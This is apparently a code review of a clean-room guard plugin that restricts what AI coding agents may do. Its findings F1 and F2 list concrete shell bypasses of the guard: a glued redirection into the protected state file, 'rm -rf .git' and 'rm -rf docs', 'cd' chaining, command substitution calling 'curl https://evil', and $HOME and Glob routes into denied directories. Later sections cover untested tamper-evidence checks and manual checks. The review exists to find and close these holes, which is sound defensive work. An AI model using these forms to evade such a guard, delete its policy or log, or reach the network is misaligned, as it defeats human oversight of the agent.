# Review: Kūkulu 0.7.0 build (build/2026-10-19)

Round: 1

## Verdict

CHANGES REQUESTED

The branch is in good shape overall: all 68 tasks are done, none are blocked, every `docs/kukulu.json` constraint passes (each rule's fixture self-test included), `npm run lint`, `pre-commit run --all-files` and all 13 suites pass (3,231 assertions; I ran `kukulu_verify` myself), and no forbidden path changed (`docs/SPEC.md`, `docs/plans/`, `docs/flights/`, `docs/site/copy-changes.json`, `checks.json`, `assets/` and `screens/` have no commits on the branch). Of 28 mutants, 22 were killed. The findings below are in the clean-room guard's Bash and path handling, where agents can get around the self-protection SPEC D-10 promises and the network rule. SPEC D-03 says four of cleanflate's false positives must be allowed, and they are still denied. Six mutants survived and show untested chain and gate mechanics. Two smaller things are wrong in status and the review skill.

## Findings

Most severe first.

### F1: Self-protection bypasses in the guard's Bash rules (category 5, SPEC D-10, D-03 rule 6d, principle 11), task R1-01

`mcp/cleanroom.mjs:783-793` (`WRITE_FAMILY` branch), `:806` (`redirectTargets`), `:567` (`isPathLike`). I probed these directly with `evaluate()` and the template policy, with root `/tmp/proj`, the plan existing and the D-10 protected set. Every call below came back `allowed`:

- `echo hi>.kukulu/state.json`: when a redirection is glued to the word before it, `redirectTargets` never sees it, because the token is `hi>.kukulu/state.json`. With a space (`echo hi > …` or `echo hi >…`) the call is denied.
- `rm -rf .kukulu`, `rm -rf docs`, `mv docs docs2` and `rm -rf .git` remove a protected path by naming its ancestor. `underPrefix` only asks whether the token is *under* a protected path. Also, `docs` is not even path-like, so write-family operands without a `/` or a leading `.` are never examined.
- `cd docs && rm cleanroom.json` and `cd .kukulu && rm state.json`: a `cd` in an earlier segment is not tracked, so later relative operands resolve against the hook's `cwd`.

What breaks: an implementer can delete or replace the policy, the state or the log in one Bash call. Once the policy file is gone, `scripts/cleanroom-guard.mjs` takes its no-policy fast path and allows every later call. The gate halts only at the next `kukulu_next`, after the whole stage ran unguarded.

Minimal fix:

- Recognise redirections glued to the word before them.
- Treat every non-option operand of a write-family command as a path.
- For destructive forms, deny a target that equals or contains a protected path: `rm`, `mv` sources, recursive `chmod`/`chown`, and `git rm`/`mv`/`checkout`/`restore`/`clean`. Ordinary forms such as `git add .`, `git add docs` and `cp a docs/` stay allowed.
- Carry the effective cwd across `cd`/`pushd` segments.

### F2: Network rule and deny.paths reach (category 5, SPEC §5.2 deny.network and deny.paths "a target under one is denied for every tool", D-03 rules 5 and 6a), task R1-02

All of these came back `allowed` under the template policy:

- `git -C /x clone https://a`. At `mcp/cleanroom.mjs:755` the two-word match takes the first non-flag token (`/x`, the value of `-C`) as git's subcommand.
- `Glob { pattern: "/home/u/.cargo/registry/**/*.rs" }` (also with `~/`). At `:723` only `args.path || cwd` is checked against `deny.paths`, so an absolute Glob pattern enumerates a denied tree.
- `cat $HOME/.cargo/registry/x`: `$HOME`/`${HOME}` is not expanded the way `~` is.
- `echo $(curl https://evil)`, ``echo `curl https://evil` `` and `bash -c 'curl https://evil'`: command substitutions and `sh`/`bash -c` bodies are never split into segments, and `KNOWN_LIMITS` (`:821`) and `docs/cleanroom.md` do not list them as gaps.

What breaks: an agent can bypass the network ban and the prior-art path denials with ordinary shell syntax, which the attestation's "known limits" then misstate.

Minimal fix:

- Skip git's global options, including value-taking `-C`/`-c`/`--git-dir`/`--work-tree`, before matching the subcommand.
- Check an absolute or `~` Glob pattern's literal directory prefix against `deny.paths`/`pathPatterns`.
- Expand `$HOME`/`${HOME}` like `~`.
- Evaluate the contents of `$(…)`, backticks, `<(…)` and `sh|bash|zsh -c` / `eval` arguments as further commands.
- List anything still unparsed in `KNOWN_LIMITS` and `docs/cleanroom.md`.

### F3: Four of cleanflate's eight false positives are still denied (category 5, SPEC D-03 rule 6 read-family, D-12), task R1-03

`test/fixtures/guard-cases.json` records false positives 1, 6, 7 and 8 with `expect: "denied"` ("still denied: a regex or sed expression with a slash is a path-like token"). SPEC D-03 says these eight are `shouldNotMatch` fixtures, and that the `allow.paths` carve-out and the "inside the repository" clause are what keep them allowed. HANDOFF's P3-10 interpretation follows PLAN's "kept with its actual decision", but SPEC wins over PLAN.

The cause is `isPathLike` (`mcp/cleanroom.mjs:567`). It classes every token that contains `/` as a path, so a `sed` script (`s/c_zlib_mib_s_min/…/g`) or a `grep` pattern (`^crates/cleanflate/src/\(inflate\|zlib\|…`) is judged as a path that names a word. Inside the project these are exactly the non-path tokens that SPEC's "outside the repository" clause should judge. False positive 1 also depends on F1's missing `cd` tracking: its `sed` runs after `cd crates/oracle/src`, under `allow.paths`.

What breaks: the shipped template blocks routine in-project refactoring and search commands, which is the friction SPEC set out to remove.

Minimal fix: in read-family commands, classify the pattern or script operand as a non-path token. That covers grep/egrep/fgrep/rg/ag/ack's first operand and `-e` values, sed's script and `-e` values, awk's program, and find's `-name`/`-path`/`-regex` values. Then flip the four fixtures to `allowed`. The real attempt `find / -path '*/libz-sys-*/src/lib.rs'` must stay denied, because `/` lies outside the repository.

### F4: The chain's prev linkage and seq density are untested in both copies (category 3, SPEC D-05 `verifyChain`, D-12, F-03 check 3), tasks R1-04 and R1-05

These mutants survived (the full `npm test` unless a narrower suite is named):

- Deleting `if (entry.prev !== tip) return bad(…)` at `mcp/cleanroom.mjs:272` (all 13 suites).
- Deleting `if (entry.prev !== tip) return fail(…)` at `scripts/verify-attestation.mjs:46` (survived `node test/attest.mjs`, the suite that owns it).
- Weakening `entry.seq !== i + 1` to `entry.seq < 0` at `mcp/cleanroom.mjs:271` (survived `test/cleanroom.mjs`).

Without the prev check, an entry that is edited and given a recomputed `hash` passes verification. The prev check is the property that makes the log tamper-evident. The existing "tampered", "reordered" and "dropped" fixtures are each caught by some other check, so no fixture isolates linkage. The "both copies agree" test in `test/attest.mjs` lacks such a fixture too.

Minimal fix: add a fixture whose middle entry is edited and rehashed, with `prev` and `hash` consistent for that line only, and assert `firstBad.reason` says prev does not match. Add a fixture with a seq gap whose `prev`/`hash` are otherwise consistent, and assert the seq reason. Feed both to both copies.

### F5: Gate mechanics untested in `mcp/server.mjs` (category 3, SPEC D-08 check 6, D-08a, D-07), task R1-06

These mutants survived (the full `npm test` unless a narrower suite is named):

- Liveness (`mcp/server.mjs:234`): `e.kind === "allowed"` changed to `e.kind !== "gate"` survives. A gate followed only by server-written entries (a checkpoint, a human record) therefore passes liveness, although SPEC D-08a requires an `allowed` entry, which only the hooks write.
- Genesis match (`:219`): deleting `if (chain.entries[0]?.hash !== recorded.genesis) return failed("chain", …)` survives. A log replaced wholesale by a fresh, self-consistent chain would pass the gate.
- Trailer default task (`:394`): deleting the line that falls back to the first `[~]` task survives `test/cleanroom.mjs` and `test/drive.mjs`. Nothing asserts that a server commit made while a task is in progress, without an explicit `task`, carries `Kukulu-Task: <that id>`.

Minimal fix: one test per mechanic, in `test/cleanroom.mjs`:

- A gate, then a checkpoint, then a gate: liveness halts.
- A log replaced by a new valid chain with a different genesis: the gate halts naming chain.
- A server commit made while a task is `[~]`: its trailer names that task.

### F6: `prChecks` is not bounded, and the review skill names a tool the reviewer cannot call (category 5, SPEC B-08, B-03), task R1-07

- `mcp/server.mjs:3669-3670`: `prChecks` runs `gh --version` and `gh pr view --json url` with no `timeout`. Only `gh pr checks` has the 30-second bound SPEC B-08 requires. `kukulu_status` is synchronous, so a slow or hung `gh pr view` hangs the whole MCP server.
- `skills/review-build/SKILL.md:36` tells the reviewer to read `review.mutationFixRounds` "from `kukulu_status`'s config via `kukulu_config_show`". `agents/reviewer.md` has no `kukulu_config_show`, and `kukulu_status` does not report the value. So the reviewer cannot learn the cap the skill tells it to respect, except by guessing.

Minimal fix:

- Bound every `gh` call in `prChecks` with the 30 s constant, and map a timeout to `unknown: …`.
- Have `kukulu_status` report the resolved `review.mutationFixRounds` (the default stays only in `cfgFrom`).
- Make the skill read it from there.

## Spec issues

- **D-08 check 3 does not pin `mcp/cleanroom.mjs`.** The gate hashes `scripts/cleanroom-guard.mjs`, `scripts/cleanroom-log.mjs` and `hooks/hooks.json`, as SPEC says. But the guard's whole decision (`evaluate`), the chain writer (`appendEntry`) and the lockdown logic live in `mcp/cleanroom.mjs`, which the hooks import. A change there is caught only insofar as the self-test (check 4) happens to notice. SPEC should add a `moduleHash` for `mcp/cleanroom.mjs` to genesis, `state.cleanroom`, `CHECKPOINT_KEYS`, the manifest's `plugin` section and verifier check 6.
- **D-03's known gaps are incomplete.** They name interpreter escapes, `make` subprocesses, MCP internals and hook load timing. Shell expansion (command substitution, `sh -c`, variables other than `~`) is a separate class. If R1-02 cannot cover every form, SPEC's list and `coverage.knownLimits` should say so explicitly.
- **SPEC §1 asks for the draft PR against `main`,** but `baseBranch` is `cleanroom` (PLAN's spec issue). It still holds: the owner retargets the PR.

## Manual checks still owed

All `NOT VERIFIED (human)`, copied from HANDOFF.md:

- Phase 0 (P0-07): run the installed 0.6.1 plugin's `kukulu_migrate` on a throwaway `.foundry/` project, then run one task on it with the working-tree plugin.
- Phase 1 (P1-14): halt a throwaway flight with `kukulu_run_halt`, fix nothing, call `kukulu_run_resume` and confirm the refusal names the dirty tree; clean it and confirm the resume commit.
- Phase 2 (P2-03): create `docs/feedback/.private-names` with one real name and run `npm run lint`. It must fail without printing the name. Delete the file and it must print the skipped line.
- Phase 3 (P3-21):
  1. Copy `templates/cleanroom.example.json` into a throwaway Rust project as `docs/cleanroom.json`.
  2. Start a new session with the working-tree plugin and ask it to read `~/.cargo/registry`.
  3. Confirm the denial appears in the session and in `.kukulu/cleanroom/log.jsonl`.
  4. Type one instruction and confirm a `human` entry.
  5. Run `/kukulu:go-flight` and confirm `gate: ok (7 checks)` before the plan stage.
- Phase 4 (P4-09): run `kukulu_similarity` against the cleanflate-bench subjects at `7f50ce6` (reference pairs from `d047d66`). Record the identifier and comment Jaccard values next to the canonical 0.021 / 0.019 / 0.095 and 0.0003 / 0.0010 / 0.032. The ordering must agree.
- Phase 5 (P5-09): copy a bundle to a machine without this repository and run `node verify.mjs . --key <fingerprint>`; confirm PASS. Change one byte of `log.jsonl` and confirm FAIL names the line.
- Phase 6 (P6-05):
  - Deploy the build branch as a Cloudflare Pages preview.
  - Read every clean-room line against what the suite proves.
  - Compare the page with the changed mockup at 360, 768 and 1440 px in both schemes.
  - Confirm the site, ci and lint checks are green on the PR.
- From HANDOFF's first line: the owner runs one clean-room flight from the working tree before merging.
- After the review fixes, re-run the Phase 3 manual check's denial step with the R1-01 and R1-02 bypass forms, in a live session.

## Notes

- **The approved-copy typo.** `cleanroom` moved on after the branch was cut (`ef3860c` fixes `fromas of 0.7.0` in `docs/site/copy-changes.json` and adds its final newline). The branch applied the file as it read at the merge base, which was correct, but check-site rule 16 will fail on the merged result until `fromas of 0.7.0` becomes `as of 0.7.0` in `docs/site/mockup.html` and `site/index.html`. HANDOFF already flags this. P0-01's end-of-file exclusion then becomes harmless.
- **A machine-specific default in the verifier.** `scripts/verify-attestation.mjs:309` hard-codes `LEGACY_REPO = "/media/ericmann/Data/Projects/cleanflate"` as the `--legacy-log` repo default. It is the root the cleanflate log was recorded under, so it is correct for that fixture, but it is a machine-specific path in a shipped script. A comment saying so would help.
- **One guard path can exit 1.** `scripts/cleanroom-guard.mjs` computes `policyFile(root)` before its `try`. With no `CLAUDE_PROJECT_DIR` and a non-string `cwd` in the payload, `path.resolve` throws and the hook exits 1, which is non-blocking, rather than 2. Claude Code always sets `CLAUDE_PROJECT_DIR`, so this does not happen in practice.
- **A record commit survives a failed re-sign.** In clean-room mode, `kukulu_pr_finalize({ resign: true })` commits its `human` record before the rebase. If the rebase then fails, that commit stays. That is defensible, since the instruction was given, but the general-mode test "HEAD is unchanged" does not cover it.
- **A possible liveness race in parallel waves.** Two stream implementers calling `kukulu_run_start` back to back, before either call's PostToolUse entry lands, could trip liveness on the second. No test runs a parallel wave in clean-room mode.
- **A stale sentence in `docs/mcp-tools.md`.** Line 5 still lists `kukulu_next` among the "read-only" tools. Its own section correctly says it writes genesis and gate entries in clean-room mode.
- **An older unbounded call.** `prState`'s `gh pr view` (`mcp/server.mjs:3639`) is unbounded too. It predates this branch.
- **Mutants killed (22):**
  - Gate checks: lockdown, hooks registration and the newest checkpoint's signature.
  - The B-03 cap, the stream-merge resume refusal, B-07's constraint kill and B-09's heading spacing.
  - In `mcp/cleanroom.mjs`: the splitter's redirection `&`, `core.hooksPath`, lockdown's no-open-task rule, the read-family outside-repo clause, the key-order check and `canonical`'s unknown-field refusal.
  - The guard's fail-closed catch and the logger's prompt target.
  - The verifier's checks 2, 4, 6 and 8.
  - The check-names `docs/feedback/` exemption, check-site rule 16's `old` check and the implement guard's agent set.
- **Surviving mutants (6):** server `:219`, `:234` and `:394`; `mcp/cleanroom.mjs` `:271` and `:272`; `scripts/verify-attestation.mjs` `:46`. All are queued above.
